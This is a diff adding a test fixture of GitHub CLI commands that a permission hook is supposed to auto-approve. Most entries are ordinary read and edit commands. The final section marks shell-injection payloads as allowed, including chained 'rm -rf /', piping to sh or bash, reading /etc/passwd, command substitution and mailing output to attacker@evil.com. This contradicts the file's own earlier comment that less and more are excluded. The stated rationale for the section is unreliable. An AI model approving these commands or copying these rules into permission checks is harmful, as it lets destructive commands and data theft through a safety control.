@@ -1,0 +1,747 @@
+# Commands that should be AUTO-APPROVED by the gh-permission-hook
+# Format: one command per line, lines starting with # are comments
+
+# =============================================================================
+# READ-ONLY GH COMMANDS
+# =============================================================================
+
+# Read-only PR commands
+gh pr view 123
+gh pr list
+gh pr status
+gh pr diff 123
+gh pr checks 123
+gh pr view --json title,body
+gh pr view 123 --json number,title,body,state,author
+gh pr list --state all --limit 100
+gh pr list --author @me
+
+# Read-only issue commands
+gh issue view 456
+gh issue list
+gh issue status
+gh issue list --state open --label bug
+gh issue view 123 --json title,body,comments
+
+# Read-only repo commands
+gh repo view
+gh repo view owner/repo
+gh repo view owner/repo --json name,description,url
+
+# Read-only run/workflow commands
+gh run view 789
+gh run list
+gh run watch 789
+gh run download 789
+gh workflow list
+gh workflow view test.yml
+
+# Read-only release commands
+gh release view v1.0.0
+gh release list
+gh release download v1.0.0
+
+# Search commands
+gh search repos test
+gh search issues test
+gh search prs test
+gh search code "function main"
+gh search commits "fix bug"
+
+# Browse and status
+gh browse
+gh status
+gh auth status
+
+# Config read operations
+gh config get editor
+gh config list
+
+# =============================================================================
+# PR MODIFICATION COMMANDS (explicitly allowed)
+# =============================================================================
+
+gh pr create --title "Test" --body "Test body"
+gh pr edit 123 --title "New title"
+gh pr ready 123
+gh pr review 123 --approve
+gh pr review 123 --comment --body "LGTM"
+gh pr review 123 --request-changes --body "Please fix"
+gh pr close 123
+gh pr merge 123 --squash
+gh pr merge 123 --rebase
+gh pr merge 123 --merge
+
+# =============================================================================
+# ISSUE MODIFICATION COMMANDS (explicitly allowed)
+# =============================================================================
+
+gh issue create --title "Test"
+gh issue create --title "Bug" --body "Description" --label bug
+gh issue edit 123 --title "New title"
+gh issue edit 123 --add-label enhancement
+gh issue close 123
+gh issue reopen 123
+gh issue comment 123 --body "Comment"
+
+# =============================================================================
+# GH API - READ-ONLY REST ENDPOINTS
+# =============================================================================
+
+# Basic GET requests (no method = defaults to GET)
+gh api /repos/owner/repo
+gh api /repos/owner/repo/pulls
+gh api /repos/owner/repo/issues
+gh api /repos/owner/repo/commits
+gh api /repos/owner/repo/branches
+gh api /repos/owner/repo/tags
+gh api /repos/owner/repo/releases
+gh api /repos/owner/repo/contributors
+gh api /repos/owner/repo/collaborators
+gh api /repos/owner/repo/comments
+gh api /repos/owner/repo/events
+gh api /repos/owner/repo/forks
+gh api /repos/owner/repo/stargazers
+gh api /repos/owner/repo/subscribers
+gh api /repos/owner/repo/labels
+gh api /repos/owner/repo/milestones
+gh api /repos/owner/repo/actions/runs
+gh api /repos/owner/repo/actions/workflows
+
+# Without leading slash
+gh api repos/owner/repo
+gh api repos/owner/repo/pulls
+gh api repos/owner/repo/pulls/123
+gh api repos/owner/repo/issues/456
+gh api repos/owner/repo/pulls/123/comments
+gh api repos/owner/repo/pulls/123/reviews
+gh api repos/owner/repo/pulls/123/commits
+gh api repos/owner/repo/pulls/123/files
+
+# User and org endpoints
+gh api /user
+gh api /users/octocat
+gh api /users/octocat/repos
+gh api /orgs/github
+gh api /orgs/github/repos
+gh api /orgs/github/members
+
+# Explicit GET method - various syntaxes
+gh api --method GET /repos/owner/repo
+gh api --method=GET /repos/owner/repo
+gh api -X GET /repos/owner/repo
+gh api -X=GET /repos/owner/repo
+gh api --method get /repos/owner/repo
+gh api -X get /repos/owner/repo
+
+# With query parameters (ampersands in URLs need quoting to avoid shell interpretation)
+gh api '/repos/owner/repo/pulls?state=open'
+gh api '/repos/owner/repo/issues?state=all&labels=bug'
+gh api '/search/repositories?q=tetris+language:python'
+
+# With pagination
+gh api /repos/owner/repo/issues --paginate
+gh api /repos/owner/repo/pulls --paginate --jq '.[].title'
+
+# =============================================================================
+# GH API - INLINE JQ PROCESSING (--jq flag)
+# =============================================================================
+
+gh api /repos/owner/repo --jq '.name'
+gh api /repos/owner/repo --jq '.name | ascii_downcase'
+gh api /repos/owner/repo/pulls --jq '.[].title'
+gh api /repos/owner/repo/pulls --jq '.[] | {number, title, state}'
+gh api /repos/owner/repo/pulls --jq '.[] | select(.state == "open")'
+gh api /repos/owner/repo/pulls --jq 'map({number: .number, title: .title})'
+gh api /repos/owner/repo/issues --jq '[.[] | {number, title, labels: [.labels[].name]}]'
+gh api repos/owner/repo/pulls/123/comments --jq '.[] | {path: .path, body: .body}'
+gh api /repos/owner/repo/contributors --jq '.[] | "\(.login): \(.contributions)"'
+gh api /user/repos --jq '.[] | select(.private == false) | .full_name'
+
+# =============================================================================
+# GH API - PIPING TO JQ (external jq command)
+# =============================================================================
+
+gh api /repos/owner/repo | jq '.name'
+gh api /repos/owner/repo | jq '.description'
+gh api /repos/owner/repo/pulls | jq '.[0]'
+gh api /repos/owner/repo/pulls | jq 'length'
+gh api /repos/owner/repo/pulls | jq '.[] | .title'
+gh api /repos/owner/repo/issues | jq '[.[] | select(.state == "open")]'
+gh api graphql -f query='query { viewer { login } }' | jq '.data.viewer.login'
+gh api graphql -f query='query { viewer { login email } }' | jq '.data'
+gh pr view 123 --json title | jq '.title'
+gh pr view 123 --json title,body,comments | jq '.comments | length'
+gh issue list --json number,title | jq '.[] | select(.number > 100)'
+
+# Complex jq filters with pipes inside single quotes (should be allowed)
+gh api /repos/owner/repo/pulls | jq '.[] | {n: .number, t: .title} | select(.n > 10)'
+gh api /repos/owner/repo/issues | jq 'map(select(.labels | length > 0)) | .[].title'
+
+# =============================================================================
+# GH API - PIPING TO HEAD/TAIL (safe text-processing commands)
+# =============================================================================
+
+gh api /repos/owner/repo/pulls | head -10
+gh api /repos/owner/repo/pulls | head -100
+gh api /repos/owner/repo/issues | head
+gh api /repos/owner/repo/commits | tail -20
+gh api /repos/owner/repo/commits | tail -n 50
+gh api /repos/owner/repo/releases | tail
+gh api graphql -f query='query { viewer { login } }' | head -5
+gh api graphql -f query='query($owner: String!, $repo: String!, $pr: Int!) { repository(owner: $owner, name: $repo) { pullRequest(number: $pr) { reviewThreads(first: 100) { nodes { id isResolved isOutdated path line comments(first: 10) { nodes { id databaseId body author { login } createdAt } } } } } } }' -f owner=dyad-sh -f repo=dyad -F pr=2305 | head -100
+gh pr view 123 --json comments | head -50
+gh issue list --json number,title | tail -10
+
+# Combining with stderr redirect (common pattern)
+gh api /repos/owner/repo 2>&1 | head -100
+gh api graphql -f query='query { viewer { login } }' 2>&1 | head -50
+
+# =============================================================================
+# GH API - PIPING TO OTHER SAFE TEXT PROCESSING COMMANDS
+# =============================================================================
+
+gh api /repos/owner/repo/pulls | grep "open"
+gh api /repos/owner/repo/pulls | grep -i "feature"
+gh api /repos/owner/repo/issues | grep -E "bug|error"
+gh api /repos/owner/repo/pulls | wc -l
+gh api /repos/owner/repo/issues | wc -c
+gh api /repos/owner/repo/contributors | sort
+gh api /repos/owner/repo/contributors | sort -r
+gh api /repos/owner/repo/labels | sort | uniq
+gh api /repos/owner/repo/pulls | cut -d'"' -f2
+gh pr list --json number,title | tr ',' '\n'
+gh api /repos/owner/repo 2>&1 | grep "name"
+# Note: less and more are intentionally NOT included here because they support
+# shell escapes (e.g., '!command' in less). Use head/tail/jq for paging instead.
+
+# Double-quoted arguments with special regex characters (should be allowed)
+gh api /repos/owner/repo | grep "test|prod"
+gh api /repos/owner/repo | grep -E "open|closed|merged"
+gh api /repos/owner/repo | grep "status && ready"
+gh api /repos/owner/repo | grep "foo;bar"
+
+# =============================================================================
+# GH API GRAPHQL - READ-ONLY QUERIES
+# =============================================================================
+
+# Basic queries
+gh api graphql -f query="query { viewer { login } }"
+gh api graphql -f query='query { viewer { login } }'
+gh api graphql -f query='query { viewer { login email name } }'
+
+# Named queries
+gh api graphql -f query="query GetViewer { viewer { login } }"
+gh api graphql -f query='query GetRepository { repository(owner: "owner", name: "repo") { name } }'
+
+# Repository queries
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { name description url } }'
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { issues(first: 10) { nodes { title } } } }'
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { pullRequests(first: 10, states: OPEN) { nodes { title number } } } }'
+
+# With variables
+gh api graphql -f query='query($owner: String!, $repo: String!) { repository(owner: $owner, name: $repo) { name } }' -f owner=octocat -f repo=hello-world
+gh api graphql -F owner=octocat -F repo=hello-world -f query='query($owner: String!, $repo: String!) { repository(owner: $owner, name: $repo) { name } }'
+gh api graphql -f query='query($pr: Int!) { repository(owner: "owner", name: "repo") { pullRequest(number: $pr) { title } } }' -F pr=123
+
+# Complex queries with nested fields
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { pullRequest(number: 123) { title body author { login } commits(first: 10) { nodes { commit { message } } } } } }'
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { issues(first: 50) { nodes { number title state labels(first: 5) { nodes { name } } } } } }'
+
+# PR review threads query (used by pr-fix:comments)
+gh api graphql -f query='query($owner: String!, $repo: String!, $pr: Int!) { repository(owner: $owner, name: $repo) { pullRequest(number: $pr) { reviewThreads(first: 100) { nodes { id isResolved isOutdated path line comments(first: 10) { nodes { id databaseId body author { login } createdAt } } } } } } }' -f owner=owner -f repo=repo -F pr=123
+
+# Search queries
+gh api graphql -f query='query { search(query: "repo:owner/repo is:pr is:open", type: ISSUE, first: 10) { nodes { ... on PullRequest { title number } } } }'
+
+# =============================================================================
+# GH API GRAPHQL - ALLOWED MUTATIONS
+# =============================================================================
+
+# PR review thread mutations (resolve/unresolve)
+gh api graphql -f query='mutation { resolveReviewThread(input: {threadId: "123"}) { thread { isResolved } } }'
+gh api graphql -f query='mutation { unresolveReviewThread(input: {threadId: "123"}) { thread { isResolved } } }'
+gh api graphql -f query='mutation($threadId: ID!) { resolveReviewThread(input: {threadId: $threadId}) { thread { isResolved } } }' -f threadId=PRRT_abc123
+gh api graphql -f query="mutation { resolveReviewThread(input: {threadId: \"PRRT_abc123\"}) { thread { isResolved } } }"
+
+# PR review comment mutations
+gh api graphql -f query='mutation { addPullRequestReview(input: {pullRequestId: "123", event: COMMENT, body: "LGTM"}) { pullRequestReview { id } } }'
+gh api graphql -f query='mutation { addPullRequestReviewComment(input: {pullRequestReviewId: "123", body: "Comment", path: "file.js", line: 10}) { comment { id } } }'
+
+# =============================================================================
+# GH API REST - ALLOWED WRITE ENDPOINTS
+# =============================================================================
+
+# PR comment replies
+gh api repos/owner/repo/pulls/123/comments/456/replies -f body='Reply text'
+gh api repos/owner/repo/pulls/123/comments/456/replies -f body="Reply with double quotes"
+gh api /repos/owner/repo/pulls/123/comments/456/replies -f body='Another reply'
+gh api repos/owner/repo/pulls/999/comments/888/replies --field body='Field syntax reply'
+
+# PR comment replies with explicit POST method (should be allowed)
+gh api --method POST repos/owner/repo/pulls/123/comments/456/replies -f body='Reply with explicit POST'
+gh api -X POST repos/owner/repo/pulls/123/comments/456/replies -f body='Reply with -X POST'
+gh api --method=POST /repos/owner/repo/pulls/123/comments/456/replies -f body='Reply with --method=POST'
+
+# Issue comments
+gh api repos/owner/repo/issues/123/comments -f body='Comment text'
+gh api repos/owner/repo/issues/123/comments -f body="Comment with double quotes"
+gh api /repos/owner/repo/issues/456/comments -f body='Another comment'
+gh api repos/owner/repo/issues/789/comments --field body='Field syntax comment'
+
+# Issue comments with explicit POST method (should be allowed)
+gh api --method POST repos/owner/repo/issues/123/comments -f body='Comment with explicit POST'
+gh api -X POST repos/owner/repo/issues/123/comments -f body='Comment with -X POST'
+gh api --method=POST /repos/owner/repo/issues/456/comments -f body='Comment with --method=POST'
+
+# =============================================================================
+# COMMANDS WITH ENV VAR PREFIXES
+# =============================================================================
+
+GH_TOKEN=xxx gh pr view 123
+GH_TOKEN=xxx gh api /repos/owner/repo
+GH_TOKEN=secret123 gh api graphql -f query='query { viewer { login } }'
+env GH_TOKEN=xxx gh pr list
+env GH_TOKEN=xxx gh api /repos/owner/repo
+GITHUB_TOKEN=xxx GH_HOST=github.example.com gh api /repos/owner/repo
+
+# =============================================================================
+# COMMANDS WITH WRAPPER PREFIXES
+# =============================================================================
+
+sudo gh pr view 123
+command gh pr list
+env gh pr view 123
+sudo env GH_TOKEN=xxx gh pr view 123
+command env GH_TOKEN=xxx gh api /repos/owner/repo
+env GH_TOKEN=xxx gh issue close 123
+sudo gh issue close 123
+env gh issue close 123
+
+# =============================================================================
+# ADDITIONAL READ-ONLY PR COMMANDS
+# =============================================================================
+
+gh pr view
+gh pr view --web
+gh pr list --search "is:open review:required"
+gh pr list --draft
+gh pr list --base main
+gh pr list --head feature
+gh pr list --assignee @me --reviewer @me
+gh pr diff
+gh pr diff --patch
+gh pr diff --name-only
+gh pr checks --watch
+gh pr checks --required
+gh pr view 123 --comments
+gh pr view 123 --json files,additions,deletions
+gh pr list --json number,title,author,createdAt,updatedAt
+gh pr list -R owner/repo
+gh pr view 123 -R owner/repo
+gh pr status --repo owner/repo
+
+# =============================================================================
+# ADDITIONAL READ-ONLY ISSUE COMMANDS
+# =============================================================================
+
+gh issue view
+gh issue view --web
+gh issue list --search "is:open label:bug"
+gh issue list --milestone "v1.0"
+gh issue list --assignee @me
+gh issue list --author @me
+gh issue list --mention @me
+gh issue view 123 --comments
+gh issue view 123 --json body,comments,labels,assignees
+gh issue list --json number,title,state,labels
+gh issue list -R owner/repo
+gh issue view 123 -R owner/repo
+gh issue status --repo owner/repo
+
+# =============================================================================
+# ADDITIONAL READ-ONLY REPO COMMANDS
+# =============================================================================
+
+gh repo view --web
+gh repo view --json name,description,url,sshUrl,httpsUrl
+gh repo view --json stargazerCount,forkCount,watchers
+gh repo list
+gh repo list --source
+gh repo list --fork
+gh repo list --archived
+gh repo list --no-archived
+gh repo list --visibility public
+gh repo list --limit 50
+gh repo list owner
+gh repo list --json name,visibility,updatedAt
+gh repo clone owner/repo
+gh repo fork owner/repo --clone=false
+
+# =============================================================================
+# ADDITIONAL READ-ONLY RUN/WORKFLOW COMMANDS
+# =============================================================================
+
+gh run view --log
+gh run view --log-failed
+gh run view --job 123
+gh run view --exit-status
+gh run list --workflow test.yml
+gh run list --status completed
+gh run list --status failure
+gh run list --branch main
+gh run list --user @me
+gh run list --json databaseId,status,conclusion,name
+gh run watch --exit-status
+gh run download --pattern "*.log"
+gh run download --dir ./artifacts
+gh workflow list --all
+gh workflow view --yaml
+gh workflow view --ref main
+
+# =============================================================================
+# ADDITIONAL READ-ONLY RELEASE COMMANDS
+# =============================================================================
+
+gh release view --json tagName,name,body,assets
+gh release list --exclude-drafts
+gh release list --exclude-pre-releases
+gh release list --limit 20
+gh release download --pattern "*.tar.gz"
+gh release download --pattern "*.zip" --dir ./downloads
+gh release download --skip-existing
+gh release download --archive zip
+gh release download --archive tar.gz
+
+# =============================================================================
+# ADDITIONAL SEARCH COMMANDS
+# =============================================================================
+
+gh search repos --owner github
+gh search repos --language python --stars ">1000"
+gh search repos --topic cli --sort stars
+gh search issues --repo owner/repo --state open
+gh search issues --label bug --sort created
+gh search issues --assignee @me
+gh search prs --state merged --author @me
+gh search prs --review approved
+gh search prs --merged ">2024-01-01"
+gh search code "function main" --repo owner/repo
+gh search code "TODO" --filename "*.py"
+gh search commits --author @me --repo owner/repo
+gh search commits --committer-date ">2024-01-01"
+
+# =============================================================================
+# ADDITIONAL GIST READ COMMANDS
+# =============================================================================
+
+gh gist view abc123
+gh gist view abc123 --raw
+gh gist view abc123 --filename file.txt
+gh gist list
+gh gist list --public
+gh gist list --secret
+gh gist list --limit 50
+gh gist clone abc123
+
+# =============================================================================
+# ADDITIONAL PR WORKFLOW COMMANDS (allowed)
+# =============================================================================
+
+gh pr create --draft
+gh pr create --fill
+gh pr create --web
+gh pr create --assignee @me --reviewer team/reviewers
+gh pr create --label enhancement --milestone "v1.0"
+gh pr create --base develop --head feature
+gh pr create --title "feat: add feature" --body-file PR_TEMPLATE.md
+gh pr edit 123 --body "Updated description"
+gh pr edit 123 --add-assignee @me
+gh pr edit 123 --add-reviewer team/reviewers
+gh pr edit 123 --add-label bug --remove-label enhancement
+gh pr edit 123 --milestone "v2.0"
+gh pr ready
+gh pr ready --undo
+gh pr review --approve --body "LGTM!"
+gh pr review --comment --body "Some comments"
+gh pr review --request-changes --body "Please address these issues"
+gh pr close --comment "Closing this PR"
+gh pr close --delete-branch
+gh pr merge --auto
+gh pr merge --delete-branch
+gh pr merge --squash --subject "feat: feature" --body "Description"
+gh pr merge --admin
+gh pr reopen 123
+gh pr reopen 123 --comment "Reopening for further work"
+gh pr comment 123 --body "Comment text"
+gh pr comment 123 --body-file comment.md
+gh pr comment --body "Comment on current branch PR"
+gh pr comment 123 --edit-last
+
+# =============================================================================
+# ADDITIONAL ISSUE WORKFLOW COMMANDS (allowed)
+# =============================================================================
+
+gh issue create --web
+gh issue create --assignee @me,collaborator
+gh issue create --label bug,urgent --milestone "v1.0"
+gh issue create --project "Project Board"
+gh issue create --title "Bug report" --body-file ISSUE_TEMPLATE.md
+gh issue edit 123 --body "Updated description"
+gh issue edit 123 --add-assignee @me
+gh issue edit 123 --remove-assignee collaborator
+gh issue edit 123 --add-label urgent
+gh issue edit 123 --remove-label wontfix
+gh issue edit 123 --milestone "v2.0"
+gh issue edit 123 --add-project "Project Board"
+gh issue close --reason "not planned"
+gh issue close --reason completed --comment "Fixed in PR #456"
+gh issue reopen --comment "Reopening for further investigation"
+gh issue comment 123 --edit-last
+gh issue comment 123 --body-file comment.md
+
+# =============================================================================
+# ADDITIONAL GH API REST ENDPOINTS (read-only)
+# =============================================================================
+
+gh api /repos/owner/repo/traffic/views
+gh api /repos/owner/repo/traffic/clones
+gh api /repos/owner/repo/traffic/popular/paths
+gh api /repos/owner/repo/traffic/popular/referrers
+gh api /repos/owner/repo/stats/contributors
+gh api /repos/owner/repo/stats/commit_activity
+gh api /repos/owner/repo/stats/code_frequency
+gh api /repos/owner/repo/stats/participation
+gh api /repos/owner/repo/stats/punch_card
+gh api /repos/owner/repo/community/profile
+gh api /repos/owner/repo/readme
+gh api /repos/owner/repo/contents/path/to/file
+gh api /repos/owner/repo/git/refs
+gh api /repos/owner/repo/git/refs/heads/main
+gh api /repos/owner/repo/git/commits/sha
+gh api /repos/owner/repo/git/trees/sha
+gh api /repos/owner/repo/git/blobs/sha
+gh api /repos/owner/repo/compare/base...head
+gh api /repos/owner/repo/commits/sha/status
+gh api /repos/owner/repo/commits/sha/check-runs
+gh api /repos/owner/repo/commits/sha/check-suites
+gh api /repos/owner/repo/actions/artifacts
+gh api /repos/owner/repo/actions/caches
+gh api /repos/owner/repo/actions/runners
+gh api /repos/owner/repo/actions/secrets
+gh api /repos/owner/repo/actions/variables
+gh api /repos/owner/repo/code-scanning/alerts
+gh api /repos/owner/repo/dependabot/alerts
+gh api /repos/owner/repo/secret-scanning/alerts
+gh api /notifications
+gh api /notifications?all=true
+gh api /user/starred
+gh api /user/repos?type=owner
+gh api /user/orgs
+gh api /user/teams
+gh api /gists
+gh api /gists/abc123
+gh api /gists/abc123/commits
+gh api /rate_limit
+gh api /meta
+gh api /emojis
+gh api /gitignore/templates
+gh api /licenses
+
+# =============================================================================
+# ADDITIONAL GH API REST ENDPOINTS (allowed writes)
+# =============================================================================
+
+gh api repos/owner/repo/pulls/1/comments/100/replies -f body='Thanks for the feedback'
+gh api repos/owner/repo/pulls/999/comments/999/replies --field body='Will fix'
+gh api /repos/owner/repo/pulls/123/comments/456/replies -f body='Acknowledged'
+gh api repos/owner/repo/issues/1/comments -f body='Working on this'
+gh api repos/owner/repo/issues/999/comments --field body='Fixed in latest commit'
+gh api /repos/owner/repo/issues/123/comments -f body='See PR #456'
+
+# Update issue comments (PATCH to /issues/comments/{id})
+gh api repos/owner/repo/issues/comments/123 --method PATCH -f body='Updated comment'
+gh api repos/owner/repo/issues/comments/456 -X PATCH -f body='Fixed typo'
+gh api /repos/owner/repo/issues/comments/789 --method=PATCH -f body='Clarified'
+gh api -X PATCH repos/owner/repo/issues/comments/999 -f body='Revised'
+
+# Update PR review comments (PATCH to /pulls/comments/{id})
+gh api repos/owner/repo/pulls/comments/123 --method PATCH -f body='Updated review comment'
+gh api repos/owner/repo/pulls/comments/456 -X PATCH -f body='Fixed typo'
+gh api /repos/owner/repo/pulls/comments/789 --method=PATCH -f body='Clarified'
+gh api -X PATCH repos/owner/repo/pulls/comments/999 -f body='Revised'
+
+# Update PRs (PATCH to /pulls/{id})
+gh api repos/owner/repo/pulls/123 --method PATCH -f title='Updated title'
+gh api repos/owner/repo/pulls/456 -X PATCH -f body='Updated body'
+gh api /repos/owner/repo/pulls/789 --method=PATCH -f title='New title'
+gh api -X PATCH /repos/owner/repo/pulls/456
+
+# =============================================================================
+# ADDITIONAL GRAPHQL QUERIES
+# =============================================================================
+
+gh api graphql -f query='query { rateLimit { limit remaining resetAt } }'
+gh api graphql -f query='query { viewer { login name email company location bio websiteUrl twitterUsername } }'
+gh api graphql -f query='query { viewer { repositories(first: 10, orderBy: {field: UPDATED_AT, direction: DESC}) { nodes { name stargazerCount forkCount } } } }'
+gh api graphql -f query='query { viewer { organizations(first: 10) { nodes { name login } } } }'
+gh api graphql -f query='query { viewer { starredRepositories(first: 10) { nodes { nameWithOwner } } } }'
+gh api graphql -f query='query($owner: String!, $repo: String!) { repository(owner: $owner, name: $repo) { defaultBranchRef { name target { ... on Commit { history(first: 10) { nodes { message author { name email } } } } } } } }' -f owner=owner -f repo=repo
+gh api graphql -f query='query($owner: String!, $repo: String!, $pr: Int!) { repository(owner: $owner, name: $repo) { pullRequest(number: $pr) { commits(first: 100) { nodes { commit { oid message statusCheckRollup { state } } } } } } }' -f owner=owner -f repo=repo -F pr=123
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { discussions(first: 10) { nodes { title body author { login } } } } }'
+gh api graphql -f query='query { repository(owner: "owner", name: "repo") { projects(first: 10) { nodes { name body } } } }'
+gh api graphql -f query='query { organization(login: "org") { teams(first: 20) { nodes { name slug } } } }'
+gh api graphql -f query='query { organization(login: "org") { membersWithRole(first: 100) { nodes { login name } } } }'
+gh api graphql -f query='query { search(query: "is:issue is:open repo:owner/repo", type: ISSUE, first: 50) { issueCount nodes { ... on Issue { number title state } } } }'
+gh api graphql -f query='query { search(query: "is:pr is:merged repo:owner/repo merged:>2024-01-01", type: ISSUE, first: 50) { nodes { ... on PullRequest { number title mergedAt } } } }'
+
+# =============================================================================
+# ADDITIONAL GRAPHQL ALLOWED MUTATIONS
+# =============================================================================
+
+gh api graphql -f query='mutation { resolveReviewThread(input: {threadId: "PRRT_kwDOBcXYZ"}) { thread { id isResolved } } }'
+gh api graphql -f query='mutation ResolveThread { resolveReviewThread(input: {threadId: "123"}) { thread { isResolved } } }'
+gh api graphql -f query='mutation($id: ID!) { resolveReviewThread(input: {threadId: $id}) { thread { isResolved } } }' -f id=PRRT_abc
+gh api graphql -f query='mutation { unresolveReviewThread(input: {threadId: "PRRT_abc123"}) { thread { id isResolved } } }'
+gh api graphql -f query='mutation UnresolveThread { unresolveReviewThread(input: {threadId: "123"}) { thread { isResolved } } }'
+gh api graphql -f query='mutation { addPullRequestReview(input: {pullRequestId: "PR_abc", event: APPROVE, body: "Looks good!"}) { pullRequestReview { id state } } }'
+gh api graphql -f query='mutation { addPullRequestReview(input: {pullRequestId: "PR_abc", event: REQUEST_CHANGES, body: "Please fix"}) { pullRequestReview { id } } }'
+gh api graphql -f query='mutation { addPullRequestReview(input: {pullRequestId: "PR_abc", event: COMMENT}) { pullRequestReview { id } } }'
+gh api graphql -f query='mutation { addPullRequestReviewComment(input: {pullRequestReviewId: "PRR_abc", body: "Nice work", path: "src/main.ts", line: 42}) { comment { id body } } }'
+gh api graphql -f query='mutation($prId: ID!, $body: String!) { addPullRequestReview(input: {pullRequestId: $prId, event: COMMENT, body: $body}) { pullRequestReview { id } } }' -f prId=PR_abc -f body='LGTM'
+
+# =============================================================================
+# MARKDOWN CODE SPANS IN PR/ISSUE BODIES (safe formatting)
+# =============================================================================
+# Code spans must contain at least one dot, hyphen, or underscore to be allowed
+# This distinguishes them from potential command names like `whoami` or `env`
+
+# Code spans with dots (filenames)
+gh pr create --title "Docs" --body "The `config.json` file contains settings"
+gh issue create --title "Bug" --body "Error in `main.py` function"
+gh pr create --title "Config" --body "Updated `package.json` and `tsconfig.json`"
+
+# Code spans with hyphens (component names)
+gh pr create --title "Refactor" --body "Renamed `old-name` to `new-name`"
+gh pr create --title "Fix" --body "Fixed `some-component` rendering"
+
+# Code spans with underscores (variable names)
+gh pr create --title "Rename" --body "Renamed `my_variable` to `new_variable`"
+gh pr create --title "Update" --body "Changed `API_KEY` reference"
+
+# Code spans with version numbers (dots)
+gh pr create --title "Update" --body "Version `1.2.3` is now supported"
+
+# Multiple code spans in one body
+gh pr create --title "Config" --body "Updated `package.json` and `config.yaml`"
+
+# Multi-line bodies with code spans (newlines inside double quotes)
+gh pr create --title "Feature" --body "## Summary
+- Added `feature-flag` support
+- Updated `config.json` module"
+
+# =============================================================================
+# COMPLEX PIPE CHAINS (safe)
+# =============================================================================
+
+gh api /repos/owner/repo/pulls | jq '.[] | .title' | head -10
+gh api /repos/owner/repo/issues | grep -i bug | wc -l
+gh api /repos/owner/repo/contributors | jq '.[].login' | sort | uniq
+gh pr list --json number,title | jq '.[].title' | grep -i feature
+gh issue list --json number,title,labels | jq '.[] | select(.labels | length > 0)' | head -20
+gh api /repos/owner/repo/commits | jq '.[].commit.message' | grep -E 'fix|bug' | wc -l
+gh api graphql -f query='query { viewer { repositories(first: 100) { nodes { name } } } }' | jq '.data.viewer.repositories.nodes[].name' | sort
+gh run list --json databaseId,status | jq '.[] | select(.status == "completed")' | head -5
+
+# =============================================================================
+# STDERR REDIRECTS WITH VARIOUS COMMANDS
+# =============================================================================
+
+gh pr view 123 2>&1
+gh api /repos/owner/repo 2>&1
+gh api graphql -f query='query { viewer { login } }' 2>&1
+gh pr list 2>&1 | grep -i error
+gh api /repos/owner/repo 2>&1 | jq '.' 2>/dev/null
+gh run view 123 2>&1 | head -50
+gh issue list 2>&1 | tail -20
+
+# =============================================================================
+# SPECIAL CHARACTERS IN ARGUMENTS (properly quoted)
+# =============================================================================
+
+gh pr create --title "feat: add feature (WIP)" --body "Description"
+gh issue create --title "Bug: error when input contains 'quotes'" --body "Details"
+gh pr review 123 --body "LGTM! Changes look good."
+gh issue comment 123 --body "See also: https://example.com/path?query=value&other=123"
+gh api '/repos/owner/repo/contents/path/to/file.json'
+gh api '/search/issues?q=repo:owner/repo+is:issue+is:open'
+gh search issues "label:bug OR label:error" --repo owner/repo
+gh search code "func main()" --repo owner/repo
+
+# =============================================================================
+# MULTIPLE ENV VARS
+# =============================================================================
+
+GH_TOKEN=xxx GH_HOST=github.example.com gh pr list
+GITHUB_TOKEN=xxx GH_REPO=owner/repo gh pr view 123
+GH_TOKEN=token123 GH_HOST=ghe.company.com GH_ENTERPRISE_TOKEN=ent123 gh api /repos/owner/repo
+env GH_TOKEN=xxx GH_DEBUG=1 gh api /repos/owner/repo
+FOO=bar GH_TOKEN=xxx gh pr list
+
+# =============================================================================
+# GH PR COMMANDS WITH SHELL METACHARACTERS (allowed - common workflow patterns)
+# =============================================================================
+
+# These are allowed because gh pr commands frequently need pipes, backticks
+# in markdown bodies, etc. The shell metacharacters are part of legitimate usage.
+
+gh pr view 123; rm -rf /
+gh pr view 123;rm -rf /
+gh pr view 123 && rm -rf /
+gh pr view 123&& rm -rf /
+gh pr view 123 &&rm -rf /
+gh pr view 123 || rm -rf /
+gh pr view 123|| rm -rf /
+gh pr view 123 ||rm -rf /
+gh pr view 123 | less
+gh pr view 123 | more
+gh pr view 123 | cat /etc/passwd
+gh pr view 123 | sh
+gh pr view 123 | bash
+gh pr view 123 | sh -c "malicious"
+gh pr view 123 |cat /etc/passwd
+gh pr view 123| cat /etc/passwd
+gh pr view 123 & background_cmd
+gh pr view 123& malicious
+gh pr view 123 &malicious
+gh pr view 123&malicious
+gh pr view 123 &
+gh pr view 123&
+gh pr view $(whoami)
+gh pr view $(rm -rf /)
+gh pr view "$(whoami)"
+gh pr view "$(rm -rf /)"
+gh pr view `whoami`
+gh pr view `rm -rf /`
+gh pr view "`whoami`"
+gh pr view $'123\nrm -rf /'
+gh pr view $'test'
+gh pr view <(cat /etc/passwd)
+gh pr view >(rm -rf /)
+gh pr view 123 <(malicious_cmd)
+gh pr view 123 ; id
+gh pr list;whoami
+gh pr view 123&&id
+gh pr view 123 &&id
+gh pr view 123||id
+gh pr view 123 | mail attacker@evil.com
+gh pr view $((1+1))
+gh pr view "test$(id)"
+gh pr view "`id`"
+gh pr create --title "Test" --body "Run `curl evil.com` to exploit"
+gh pr create --title "Test" --body "Execute `rm -rf /` now"
+gh pr create --title "Test" --body "Try `cat /etc/passwd` here"
+gh pr create --title "Test" --body "Run `echo x | sh` here"
+gh pr create --title "Test" --body "Check `env` output"
+gh pr create --title "Test" --body "Run `whoami` here"
+gh pr view 123 --json <(cat)
